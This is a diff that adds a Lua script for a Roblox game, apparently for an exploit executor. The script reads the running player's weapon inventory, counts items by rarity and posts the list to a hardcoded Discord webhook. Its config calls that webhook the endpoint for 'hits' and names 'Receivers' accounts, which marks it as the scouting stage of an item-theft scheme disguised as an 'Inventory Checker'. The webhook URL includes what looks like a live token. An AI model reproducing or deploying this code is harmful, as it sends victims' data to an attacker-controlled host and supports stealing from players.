@@ -1,1 +1,95 @@
+Config = {
+    Receivers = {"123", "1234"}, -- Your Username/s.
+    Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
+    FullInventory = true, -- If true, it will display all of the player's items.
+}
 
+repeat wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Inventory = {}
+
+local function sendnotification(message)
+    print("[Inventory Check]: " .. message)
+end
+
+-- Function to iterate through the inventory
+local function checkInventory()
+    local Common, Uncommon, Rare, Legendary, Godly, Ancient, Unique, Vintage = 0, 0, 0, 0, 0, 0, 0, 0
+
+    local UIPath
+    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
+        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+    else
+        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+    end
+
+    -- Iterate over items in inventory
+    local function checkItem(v)
+        if v:IsA("Frame") then
+            local color = v.ItemName.BackgroundColor3
+            if color == Color3.fromRGB(106, 106, 106) then
+                Common = Common + 1
+            elseif color == Color3.fromRGB(0, 255, 255) then
+                Uncommon = Uncommon + 1
+            elseif color == Color3.fromRGB(0, 200, 0) then
+                Rare = Rare + 1
+            elseif color == Color3.fromRGB(220, 0, 5) then
+                Legendary = Legendary + 1
+            elseif color == Color3.fromRGB(255, 0, 179) then
+                Godly = Godly + 1
+            elseif color == Color3.fromRGB(100, 10, 255) then
+                Ancient = Ancient + 1
+            elseif color == Color3.fromRGB(240, 140, 0) then
+                Unique = Unique + 1
+            elseif color == Color3.fromRGB(255, 255, 0) then
+                Vintage = Vintage + 1
+            end
+            table.insert(Inventory, v.ItemName.Label.Text)
+        end
+    end
+
+    -- Check all items in the inventory
+    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        checkItem(v)
+    end
+
+    -- Send the inventory to the webhook
+    local data = {
+        username = "Inventory Checker",
+        content = "Here is the list of your inventory items:",
+        embeds = {
+            {
+                title = "Player Inventory",
+                description = "Items in Inventory:\n```" .. table.concat(Inventory, ", ") .. "```",
+                fields = {
+                    {name = "Common", value = Common},
+                    {name = "Uncommon", value = Uncommon},
+                    {name = "Rare", value = Rare},
+                    {name = "Legendary", value = Legendary},
+                    {name = "Godly", value = Godly},
+                    {name = "Ancient", value = Ancient},
+                    {name = "Unique", value = Unique},
+                    {name = "Vintage", value = Vintage}
+                },
+                color = 0x3365FF
+            }
+        }
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    request({
+        Url = Config.Webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = game.HttpService:JSONEncode(data)
+    })
+
+    sendnotification("Inventory check completed and sent to webhook.")
+end
+
+-- Run the inventory check when the game is fully loaded
+checkInventory()
